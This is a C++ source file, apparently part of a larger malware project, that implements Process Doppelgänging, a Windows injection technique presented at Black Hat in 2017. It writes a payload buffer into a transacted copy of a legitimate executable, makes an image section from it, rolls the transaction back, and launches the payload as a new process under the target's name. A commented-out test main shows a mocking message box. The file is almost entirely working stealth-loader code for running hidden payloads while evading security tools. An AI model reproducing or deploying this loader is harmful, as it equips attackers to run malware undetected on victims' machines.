//
// Ref = src
// https://www.blackhat.com/docs/eu-17/materials/eu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf
//
// Credits:
//  Vyacheslav Rusakov @swwwolf
//  Tom Bonner @thomas_bonner
//

// https://gist.github.com/hfiref0x/a9911a0b70b473281c9da5daea9a177f

#include <Windows.h>
#include <ntstatus.h>
#include "process_droppelganging.h"
#include "global_config.h"
#include <stdio.h>
#include <string>

#include "debug.h"
#include "functions_table.h"

std::wstring s2ws(const std::string& str)
{
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
    std::wstring wstrTo(size_needed, 0);
    MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
    return wstrTo;
}

bool process_doppelganging(
    _In_ LPCSTR lpTargetApp,
    _In_ PVOID Buffer,
    DWORD TOR_PAYLOAD_LEN
)
{
    BOOL bCond = FALSE;
    NTSTATUS status;
    HANDLE hTransaction = NULL, hTransactedFile = INVALID_HANDLE_VALUE, hFile = INVALID_HANDLE_VALUE;
    HANDLE hSection = NULL, hProcess = NULL, hThread = NULL;
    LARGE_INTEGER fsz;
    ULONG ReturnLength = 0;
    ULONG_PTR EntryPoint = 0, ImageBase = 0;
    PVOID MemoryPtr = NULL;
    SIZE_T sz = 0;
    PEB* Peb;

    PROCESS_BASIC_INFORMATION pbi;

    PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;

    OBJECT_ATTRIBUTES obja;
    UNICODE_STRING    ustr;

    BYTE temp[0x1000];

    DBG_MSG("process_doppelganging() - Started.\n");


    do {
        RtlSecureZeroMemory(&temp, sizeof(temp));

        //
        // Create TmTx transaction object.
        //
        InitializeObjectAttributes(&obja, NULL, 0, NULL, NULL);
        status = NtCreateTransaction(&hTransaction,
            TRANSACTION_ALL_ACCESS,
            &obja,
            NULL,
            NULL,
            0,
            0,
            0,
            NULL,
            NULL);

        if (!NT_SUCCESS(status)) {
            DBG_MSG("process_doppelganging() - NtCreateTransaction() failed. code: %d", l_GetLastError());
            return false;
        }

        //
        // Open target file for transaction.
        //
        hTransactedFile = CreateFileTransactedA(lpTargetApp,
            GENERIC_WRITE | GENERIC_READ,
            0,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL,
            hTransaction,
            NULL,
            NULL);

        if (hTransactedFile == INVALID_HANDLE_VALUE) {
            DBG_MSG("CreateFileTransacted failed. error code: %d \n", l_GetLastError());
            return false;;
        }

        /*
        //
        // Open file payload.
        //
        hFile = CreateFileA(lpPayloadApp,
            GENERIC_READ,
            0,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            DBG_MSG("CreateFile(target) failed");
            return false;;
        }

        //
        // Query payload file size.
        //
        if (!GetFileSizeEx(hFile, &fsz)) {
            DBG_MSG("GetFileSizeEx(target) failed");
            return false;;
        }

        //
        // Allocate buffer for payload file.
        //
        Buffer = NULL;
        sz = (SIZE_T)fsz.LowPart;
        status = NtAllocateVirtualMemory(NtCurrentProcess(),
            &Buffer,
            0,
            &sz,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE);

        if (!NT_SUCCESS(status)) {
            DBG_MSG("NtAllocateVirtualMemory(fsz.LowPart) failed");
            return false;;
        }

        //
        // Read payload file to the buffer.
        //
        if (!ReadFile(hFile, Buffer, fsz.LowPart, &ReturnLength, NULL)) {
            DBG_MSG("ReadFile(hFile, Buffer) failed");
            return false;;
        }

        CloseHandle(hFile);
        hFile = INVALID_HANDLE_VALUE;

        */


        fsz.LowPart = TOR_PAYLOAD_LEN;
        //
        // Write buffer into transaction.
        //
        if (!WriteFile(hTransactedFile, Buffer, fsz.LowPart, &ReturnLength, NULL)) {
            DBG_MSG("process_doppelganging() - WriteFile(hTransactedFile, Buffer) failed, error code: %d\n", l_GetLastError);
            return false;;
        }

        //
        // Create section from transacted file.
        //
        status = NtCreateSection(&hSection,
            SECTION_ALL_ACCESS,
            NULL,
            0,
            PAGE_READONLY,
            SEC_IMAGE,
            hTransactedFile);
        if (!NT_SUCCESS(status)) {
            DBG_MSG("process_doppelganging() - NtCreateSection(hTransactedFile) failed, erro code: %d", l_GetLastError());
            return false;;
        }

        status = NtRollbackTransaction(hTransaction, TRUE);
        if (!NT_SUCCESS(status)) {
            DBG_MSG("process_doppelganging() - NtRollbackTransaction(hTransaction) failed, error code: %d", l_GetLastError());
            return false;;
        }

        NtClose(hTransaction);
        hTransaction = NULL;

        l_CloseHandle(hTransactedFile);
        hTransactedFile = INVALID_HANDLE_VALUE;

        //
        // Create process object with transacted section.
        //
        //
        // Warning: due to MS brilliant coding skills (NULL ptr dereference) 
        //          this call will trigger BSOD on Windows 10 prior to RS3.
        //
        hProcess = NULL;
        status = NtCreateProcessEx(&hProcess,
            PROCESS_ALL_ACCESS,
            NULL,
            NtCurrentProcess(),
            PS_INHERIT_HANDLES,
            hSection,
            NULL,
            NULL,
            FALSE);

        if (!NT_SUCCESS(status)) {
            DBG_MSG("process_doppelganging() - NtCreateProcessEx(hSection) failed, error code: %d\n", l_GetLastError());
            return false;;
        }

        //
        // Query payload file entry point value.
        //
        status = NtQueryInformationProcess(hProcess,
            ProcessBasicInformation,
            &pbi,
            sizeof(PROCESS_BASIC_INFORMATION),
            &ReturnLength);

        if (!NT_SUCCESS(status)) {
            DBG_MSG("process_doppelganging() - NtQueryInformationProcess failed, error code: %d\n", l_GetLastError());
            return false;;
        }

        status = NtReadVirtualMemory(hProcess, pbi.PebBaseAddress, &temp, 0x1000, &sz);
        if (!NT_SUCCESS(status)) {
            DBG_MSG("process_doppelganging() - NtReadVirtualMemory failed, error code: %d\n", l_GetLastError());
            return false;;
        }

        EntryPoint = (ULONG_PTR)RtlImageNtHeader(Buffer)->OptionalHeader.AddressOfEntryPoint;
        EntryPoint += (ULONG_PTR)((PPEB)temp)->ImageBaseAddress;

        //
        // Create process parameters block.
        //
        //RtlInitUnicodeString(&ustr, "C:\\windows\\system32\\svchost.exe");
        std::string str_target_app = std::string(lpTargetApp);

        std::wstring wstr_target_app = s2ws(str_target_app);
        
        RtlInitUnicodeString(&ustr, (PCWSTR)&wstr_target_app);
        
        status = RtlCreateProcessParametersEx(&ProcessParameters,
            &ustr,
            NULL,
            NULL,
            &ustr,
            NULL,
            NULL,
            NULL,
            NULL,
            NULL,
            RTL_USER_PROC_PARAMS_NORMALIZED);

        if (!NT_SUCCESS(status)) {
            DBG_MSG("process_doppelganging() - RtlCreateProcessParametersEx failed, error code: %d", l_GetLastError());
            return false;;
        }

        //
        // Allocate memory in target process and write process parameters block.
        //
        sz = ProcessParameters->EnvironmentSize + ProcessParameters->MaximumLength;
        MemoryPtr = ProcessParameters;

        status = NtAllocateVirtualMemory(hProcess,
            &MemoryPtr,
            0,
            &sz,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_READWRITE);

        if (!NT_SUCCESS(status)) {
            DBG_MSG("process_doppelganging() - NtAllocateVirtualMemory(ProcessParameters) failed, error code: %d", l_GetLastError());
            return false;;
        }

        sz = 0;
        status = NtWriteVirtualMemory(hProcess,
            ProcessParameters,
            ProcessParameters,
            ProcessParameters->EnvironmentSize + ProcessParameters->MaximumLength,
            &sz);

        if (!NT_SUCCESS(status)) {
            DBG_MSG("process_doppelganging() - NtWriteVirtualMemory(ProcessParameters) failed, error code: %d", l_GetLastError());
            return false;;
        }

        //
        // Update PEB->ProcessParameters pointer to newly allocated block.
        //
        Peb = (PEB*)pbi.PebBaseAddress;
        status = NtWriteVirtualMemory(hProcess,
            &Peb->ProcessParameters,
            &ProcessParameters,
            sizeof(PVOID),
            &sz);
        if (!NT_SUCCESS(status)) {
            DBG_MSG("process_doppelganging() - NtWriteVirtualMemory(Peb->ProcessParameters) failed, error code: %d", l_GetLastError());
            return false;;
        }

        //
        // Create primary thread.
        //
        hThread = NULL;
        status = NtCreateThreadEx(&hThread,
            THREAD_ALL_ACCESS,
            NULL,
            hProcess,
            (LPTHREAD_START_ROUTINE)EntryPoint,
            NULL,
            FALSE,
            0,
            0,
            0,
            NULL);
        if (!NT_SUCCESS(status)) {
            DBG_MSG("process_doppelganging() - NtCreateThreadEx(EntryPoint) failed, erro code: %d\n", l_GetLastError());
            return false;;
        }

    } while (bCond);

    if (hTransaction)
        NtClose(hTransaction);
    if (hSection)
        NtClose(hSection);
    if (hProcess)
        NtClose(hProcess);
    if (hThread)
        NtClose(hThread);
    if (hTransactedFile != INVALID_HANDLE_VALUE)
        l_CloseHandle(hTransactedFile);
    if (hFile != INVALID_HANDLE_VALUE)
        l_CloseHandle(hFile);
    if (Buffer != NULL) {
        sz = 0;
        NtFreeVirtualMemory(NtCurrentProcess(), &Buffer, &sz, MEM_RELEASE);
    }
    if (ProcessParameters) {
        RtlDestroyProcessParameters(ProcessParameters);
    }

    return true;
}

/*
void main()
{
    ProcessDoppelgänging("C:\\test\\target.exe", "C:\\test\\payload.exe");
    ExitProcess(0);
}
*/
/*
void main()
{
    MessageBox(GetDesktopWindow(), "Surprise motherfucker", NULL, MB_ICONINFORMATION);
}*/